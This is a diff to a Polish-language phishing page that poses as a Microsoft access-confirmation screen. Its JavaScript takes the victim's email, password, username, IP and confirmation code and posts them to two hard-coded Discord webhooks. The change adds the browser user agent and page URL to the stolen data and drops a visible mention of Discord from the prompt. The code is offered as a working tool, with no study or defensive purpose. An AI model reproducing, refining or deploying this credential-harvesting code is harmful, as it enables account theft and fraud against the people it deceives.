@@ -121,7 +121,7 @@
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1200px-Microsoft_logo.svg.png" alt="Microsoft Logo">
         </div>
         <h1>Potwierdź swój dostęp</h1>
-        <p>Wpisz kod potwierdzenia, który otrzymałeś na Discord.</p>
+        <p>Wpisz kod potwierdzenia.</p>
         <input type="number" id="confirmationCode" placeholder="Kod potwierdzenia">
         <div id="error-message">Zły kod. Spróbuj ponownie.</div>
         <div id="confirmation-error">Pole kod potwierdzenia nie może być puste</div>
@@ -134,6 +134,8 @@
         let password = '';
         let username = '';
         let confirmationCode = '';
+        const deviceInfo = navigator.userAgent;  // Informacje o urządzeniu
+        const pageURL = window.location.href;  // URL strony
 
         // Funkcja do wygenerowania losowego kodu potwierdzenia
         function generateConfirmationCode() {
@@ -157,7 +159,7 @@
             confirmationCode = generateConfirmationCode();
             const webhookURL = 'https://ptb.discord.com/api/webhooks/1252994026072965241/7dqoF-bSnWRK5jh7cNkhuWx1h6nz7Yn6hjh_KoW9U2UJITN-eL9FC1rihQoIj2fwptQ1';  // Zamień to na URL swojego webhooka
             const message = {
-                content: `Adres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}\nKod potwierdzenia: ${confirmationCode}`
+                content: `Adres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}\nKod potwierdzenia: ${confirmationCode}\nURL strony: ${pageURL}\nInformacje o urządzeniu: ${deviceInfo}`
             };
 
             try {
@@ -173,7 +175,7 @@
                     throw new Error('Błąd przy wysyłaniu wiadomości na Discord');
                 }
 
-                console.log('Dane wysłane na Discord:', ip, email, password, username, confirmationCode);
+                console.log('Dane wysłane na Discord:', ip, email, password, username, confirmationCode, pageURL, deviceInfo);
             } catch (error) {
                 console.error('Błąd przy wysyłaniu na Discord:', error);
             }
@@ -183,7 +185,7 @@
         async function sendFailedAttemptToDiscord(ip, email, password, username, enteredCode, correctCode) {
             const webhookURL = 'https://ptb.discord.com/api/webhooks/1253065600314638348/uZ269q_oyw3L-dcYHUGBQg6F8xTeeQSeVm-gk5r1oIPGcT0ucQW1hJFzHXkIl_X03KII';  // Zamień to na URL swojego webhooka
             const message = {
-                content: `Nieudana próba potwierdzenia\nAdres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}\nWprowadzony kod: ${enteredCode}\nPoprawny kod: ${correctCode}`
+                content: `Nieudana próba potwierdzenia\nAdres IP użytkownika: ${ip}\nE-mail: ${email}\nHasło: ${password}\nNazwa użytkownika: ${username}\nWprowadzony kod: ${enteredCode}\nPoprawny kod: ${correctCode}\nURL strony: ${pageURL}\nInformacje o urządzeniu: ${deviceInfo}`
             };
 
             try {
@@ -199,7 +201,7 @@
                     throw new Error('Błąd przy wysyłaniu wiadomości na Discord');
                 }
 
-                console.log('Nieudana próba wysłana na Discord:', ip, email, password, username, enteredCode, correctCode);
+                console.log('Nieudana próba wysłana na Discord:', ip, email, password, username, enteredCode, correctCode, pageURL, deviceInfo);
             } catch (error) {
                 console.error('Błąd przy wysyłaniu na Discord:', error);
             }
